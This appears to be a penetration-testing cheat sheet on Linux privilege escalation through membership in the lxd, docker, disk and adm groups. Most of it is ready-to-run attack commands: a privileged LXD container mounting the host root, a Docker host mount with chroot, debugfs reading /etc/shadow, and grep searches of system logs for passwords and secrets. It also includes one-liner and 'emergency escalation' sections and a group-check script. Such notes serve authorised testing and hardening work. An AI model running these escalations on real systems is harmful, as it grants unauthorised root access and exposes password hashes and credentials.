# 👑 Privileged Groups

## 🎯 Overview

Certain Linux groups provide elevated privileges that can be exploited for privilege escalation through container access, disk manipulation, or administrative file access.

## 🐳 High-Risk Groups

### LXD Group
**Impact**: Container root = host root
```bash
# Check membership
id | grep lxd

# Create privileged container
lxd init  # Use defaults
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

# Access host filesystem as root
cd /mnt/root/root
```

### Docker Group
**Impact**: Host filesystem access via containers
```bash
# Check membership
id | grep docker

# Mount host filesystem
docker run -v /:/mnt -it ubuntu
cd /mnt/root  # Host root directory
```

### Disk Group
**Impact**: Raw device access
```bash
# Check membership
id | grep disk

# Access filesystem directly
debugfs /dev/sda1
# In debugfs: cat /etc/shadow
```

### ADM Group
**Impact**: Log file access
```bash
# Check membership
id | grep adm

# Read all system logs
find /var/log -readable 2>/dev/null
grep -r "password\|secret" /var/log/ 2>/dev/null
```

## 🚀 Quick Exploitation

### LXD Privilege Escalation
```bash
# One-liner container escalation (if alpine image exists)
lxc init alpine pwn -c security.privileged=true && lxc config device add pwn host disk source=/ path=/mnt/root recursive=true && lxc start pwn && lxc exec pwn /bin/sh
```

### Docker Escalation
```bash
# Mount host root
docker run -v /:/hostfs -it ubuntu bash
chroot /hostfs
```

### Other Dangerous Groups
```bash
# Video group - framebuffer access
id | grep video

# Audio group - audio device access  
id | grep audio

# Shadow group - /etc/shadow access
id | grep shadow

# Staff group - /usr/local write access
id | grep staff
```

## 🔍 Group Enumeration

### Check All User Groups
```bash
# Current user groups
id
groups

# All groups on system
cat /etc/group

# Group membership details
getent group lxd
getent group docker
getent group disk
getent group adm
```

### Privileged Group Detection Script
```bash
#!/bin/bash
echo "=== PRIVILEGED GROUPS CHECK ==="

dangerous_groups="lxd docker disk adm shadow staff video audio"

echo "[+] Current user groups:"
id

for group in $dangerous_groups; do
    if id | grep -q $group; then
        echo "[!] PRIVILEGED GROUP: $group"
        case $group in
            lxd) echo "    -> Container root access" ;;
            docker) echo "    -> Host filesystem access" ;;
            disk) echo "    -> Raw device access" ;;
            adm) echo "    -> Log file access" ;;
            shadow) echo "    -> Password hash access" ;;
        esac
    fi
done
```

## 🔑 Quick Reference

### Immediate Checks
```bash
# Check for dangerous group membership
id | grep -E "(lxd|docker|disk|adm|shadow)"

# LXD quick escalation
lxc image list  # Check for existing images
lxc list       # Check existing containers

# Docker quick escalation  
docker images  # Check available images
docker ps -a   # Check containers
```

### Emergency Escalation
```bash
# If in lxd group
lxc exec container_name /bin/sh

# If in docker group
docker run -v /:/mnt -it ubuntu

# If in disk group
debugfs /dev/sda1

# If in adm group
find /var/log -readable | head -10
```

---

*Privileged group membership often provides immediate privilege escalation paths - container access, disk manipulation, and administrative file access can lead directly to root privileges.* 